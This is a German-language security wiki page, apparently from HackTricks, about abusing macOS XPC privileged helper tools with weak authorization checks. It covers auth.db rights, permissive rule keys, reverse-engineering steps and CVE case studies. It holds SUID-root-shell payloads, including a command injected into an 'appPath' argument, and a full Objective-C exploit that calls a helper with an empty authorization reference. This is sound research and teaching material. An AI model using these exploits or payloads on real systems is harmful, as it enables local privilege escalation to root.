# macOS XPC-Autorisierung

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC-Autorisierung

Apple schlägt außerdem eine andere Möglichkeit zur Authentifizierung vor, wenn der verbindende Prozess **die Berechtigung besitzt, eine exponierte XPC-Methode aufzurufen**.

Wenn eine Anwendung **Aktionen als privilegierter Benutzer ausführen** muss, installiert sie, anstatt die App als privilegierten Benutzer auszuführen, normalerweise als root ein HelperTool als XPC-Dienst, der von der App aufgerufen werden kann, um diese Aktionen auszuführen. Die App, die den Dienst aufruft, sollte jedoch über ausreichende Autorisierung verfügen.

### ShouldAcceptNewConnection always YES

An example could be found in [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). In `App/AppDelegate.m` it tries to **connect** to the **HelperTool**. And in `HelperTool/HelperTool.m` the function **`shouldAcceptNewConnection`** **won't check** any of the requirements indicated previously. It'll always return YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Für weitere Informationen dazu, wie dieser Check richtig konfiguriert wird:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Anwendungsrechte

Es findet jedoch eine gewisse **authorization statt, wenn eine Methode vom HelperTool aufgerufen wird**.

Die Funktion **`applicationDidFinishLaunching`** aus `App/AppDelegate.m` erstellt nach dem Start der App eine leere authorization reference. Dies sollte immer funktionieren.\
Dann versucht sie, dieser authorization reference durch Aufruf von `setupAuthorizationRights` **einige Rechte hinzuzufügen**:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Die Funktion `setupAuthorizationRights` aus `Common/Common.m` speichert die Rechte der Anwendung in der auth-Datenbank `/var/db/auth.db`. Beachte, dass sie nur die Rechte hinzufügt, die noch nicht in der Datenbank vorhanden sind:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Die Funktion `enumerateRightsUsingBlock` ist diejenige, die verwendet wird, um die Berechtigungen von Anwendungen zu ermitteln, die in `commandInfo` definiert sind:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Das bedeutet, dass am Ende dieses Prozesses die innerhalb von `commandInfo` deklarierten Berechtigungen in `/var/db/auth.db` gespeichert werden. Beachte, dass du dort für **jede Methode**, die **Authentifizierung erfordert**, den **Berechtigungsnamen** und das **`kCommandKeyAuthRightDefault`** findest. Letzteres **gibt an, wer dieses Recht erhalten kann**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Jeder</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niemand</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Der aktuelle Benutzer muss ein Admin sein (Mitglied der admin-Gruppe)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Fordert den Benutzer zur Authentifizierung auf.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Fordert den Benutzer zur Authentifizierung auf. Er muss ein Admin sein (Mitglied der admin-Gruppe)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Regeln angeben</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Ggf. zusätzliche Kommentare für das Recht angeben</td></tr></tbody></table>

### Überprüfung der Rechte

In `HelperTool/HelperTool.m` prüft die Funktion **`readLicenseKeyAuthorization`**, ob der Aufrufer berechtigt ist, **eine solche Methode auszuführen**, indem sie die Funktion **`checkAuthorization`** aufruft. Diese Funktion überprüft, ob die vom aufrufenden Prozess gesendeten **authData** das **korrekte Format** haben, und prüft anschließend, **was erforderlich ist, um das Recht** zum Aufrufen der spezifischen Methode zu erhalten. Wenn alles gut läuft, ist der **zurückgegebene `error` `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Beachte, dass die Funktion `authorizationRightForCommand` zur **Prüfung der Voraussetzungen, um das Recht zum Aufruf dieser Methode zu erhalten** lediglich das zuvor kommentierte Objekt **`commandInfo`** prüft. Anschließend ruft sie **`AuthorizationCopyRights`** auf, um zu prüfen, **ob sie die Rechte** hat, die Funktion aufzurufen (die Flags erlauben dabei Interaktion mit dem Benutzer).

In diesem Fall ist für den Aufruf der Funktion `readLicenseKeyAuthorization` `kCommandKeyAuthRightDefault` auf `@kAuthorizationRuleClassAllow` gesetzt. Daher kann **jeder sie aufrufen**.

### DB-Informationen

Es wurde erwähnt, dass diese Informationen in `/var/db/auth.db` gespeichert sind. Du kannst alle gespeicherten Regeln mit folgendem Befehl auflisten:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Dann kannst du sehen, wer auf das Recht zugreifen kann:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Freizügige Rechte

Du kannst **alle Berechtigungskonfigurationen** [**hier**](https://www.dssw.co.uk/reference/authorization-rights/) finden, aber die Kombinationen, die keine Benutzerinteraktion erfordern würden, sind:

1. **'authenticate-user': 'false'**
- Dies ist der direkteste Schlüssel. Wenn er auf `false` gesetzt ist, legt er fest, dass ein Benutzer keine Authentifizierung benötigt, um dieses Recht zu erhalten.
- Wird in **Kombination mit einem der beiden folgenden oder mit der Angabe einer Gruppe**, der der Benutzer angehören muss, verwendet.
2. **'allow-root': 'true'**
- Wenn ein Benutzer als root (mit erhöhten Rechten) arbeitet und dieser Schlüssel auf `true` gesetzt ist, könnte der root-Benutzer dieses Recht möglicherweise ohne weitere Authentifizierung erhalten. Allerdings erfordert das Erlangen des root-Status in der Regel bereits Authentifizierung, sodass dies für die meisten Benutzer kein 'keine Authentifizierung'-Szenario ist.
3. **'session-owner': 'true'**
- Wenn auf `true` gesetzt, erhält der Inhaber der Session (der aktuell angemeldete Benutzer) dieses Recht automatisch. Dies kann zusätzliche Authentifizierung umgehen, sofern der Benutzer bereits angemeldet ist.
4. **'shared': 'true'**
- Dieser Schlüssel gewährt Rechte nicht ohne Authentifizierung. Stattdessen bedeutet er bei Setzen auf `true`, dass, sobald das Recht einmal authentifiziert wurde, es unter mehreren Prozessen geteilt werden kann, ohne dass sich jeder erneut authentifizieren muss. Die initiale Gewährung des Rechts würde jedoch weiterhin eine Authentifizierung erfordern, es sei denn, er wird mit anderen Schlüsseln wie `'authenticate-user': 'false'` kombiniert.

Du kannst [**dieses Skript verwenden**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) um die interessanten Rechte zu ermitteln:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Fallstudien

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Der privilegierte Mach‑Dienst `com.acustica.HelperTool` akzeptiert jede Verbindung und seine `checkAuthorization:`‑Routine ruft `AuthorizationCopyRights(NULL, …)` auf, sodass jeder 32‑byte blob akzeptiert wird. `executeCommand:authorization:withReply:` speist dann vom Angreifer kontrollierte, durch Kommas getrennte Strings als root in `NSTask` ein, wodurch payloads wie:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
ermöglicht das triviale Erstellen einer SUID root shell. Details in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Der Listener gibt immer YES zurück und dasselbe NULL `AuthorizationCopyRights`-Muster erscheint in `checkAuthorization:`. Die Methode `exchangeAppWithReply:` fügt die Eingabe des Angreifers zweimal in einen `system()`-String ein, sodass das Injizieren von Shell-Metazeichen in `appPath` (z. B. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) zur Ausführung von Code als root über den Mach-Service `com.plugin-alliance.pa-installationhelper` führt. Mehr Infos [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Das Ausführen eines Audits legt `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` ab, setzt den Mach-Service `com.jamf.complianceeditor.helper` frei und exportiert `-executeScriptAt:arguments:then:` ohne die `AuthorizationExternalForm` des Aufrufers oder die Code-Signatur zu prüfen. Ein trivialer Exploit `AuthorizationCreate`s eine leere Referenz, verbindet sich mit `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` und ruft die Methode auf, um beliebige Binaries als root auszuführen. Vollständige Reversing-Notizen (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 und 7.4.0–7.4.2 akzeptierten manipulierte XPC-Nachrichten, die einen privilegierten Helper ohne Autorisierungsprüfungen erreichten. Da der Helper seiner eigenen privilegierten `AuthorizationRef` vertraute, konnte jeder lokale Benutzer, der dem Service Nachrichten senden konnte, ihn dazu zwingen, beliebige Konfigurationsänderungen oder Befehle als root auszuführen. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Schnelle Triage-Tipps

- Wenn eine App sowohl ein GUI als auch einen Helper mitliefert, diff ihre Code-Anforderungen und prüfe, ob `shouldAcceptNewConnection` den Listener mit `-setCodeSigningRequirement:` sperrt (oder `SecCodeCopySigningInformation` validiert). Fehlende Prüfungen führen normalerweise zu CWE-863-Szenarien wie im Jamf-Fall. Ein schneller Blick sieht so aus:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Vergleiche, was der Helper *denkt*, dass er autorisiert, mit dem, was der Client liefert. Beim Rückentwickeln setze einen Breakpoint auf `AuthorizationCopyRights` und bestätige, dass das `AuthorizationRef` von `AuthorizationCreateFromExternalForm` (vom Client bereitgestellt) stammt, anstatt aus dem eigenen privilegierten Kontext des Helpers; andernfalls hast du wahrscheinlich ein CWE-863-Muster gefunden, ähnlich den oben genannten Fällen.

## Rückentwicklung von Authorization

### Prüfen, ob EvenBetterAuthorization verwendet wird

Wenn du die Funktion findest: **`[HelperTool checkAuthorization:command:]`**, verwendet der Prozess wahrscheinlich das oben erwähnte Schema für Authorization:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

In diesem Fall — wenn diese Funktion Funktionen wie `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` aufruft — verwendet sie [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Check the **`/var/db/auth.db`** to see if it's possible to get permissions to call some privileged action without user interaction.

### Protokollkommunikation

Dann musst du das Protokoll-Schema finden, um eine Kommunikation mit dem XPC-Service herstellen zu können.

Die Funktion **`shouldAcceptNewConnection`** zeigt das exportierte Protokoll an:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

In this case, we have the same as in EvenBetterAuthorizationSample, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Wenn man den Namen des verwendeten Protokolls kennt, ist es möglich, dessen Header-Definition zu **dumpen** mit:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Zuletzt brauchen wir nur noch den **Namen des exponierten Mach Service**, um eine Kommunikation mit ihm herzustellen. Es gibt mehrere Möglichkeiten, diesen zu finden:

- In der **`[HelperTool init]`**, wo du den verwendeten Mach Service sehen kannst:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- In der launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit-Beispiel

In diesem Beispiel wird erstellt:

- Die Definition des protocol mit den functions
- Eine leere auth, um nach Zugriff zu fragen
- Eine Verbindung zum XPC service
- Ein Aufruf der function, wenn die Verbindung erfolgreich war
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Weitere XPC privilege helpers, die missbraucht werden

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Referenzen

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
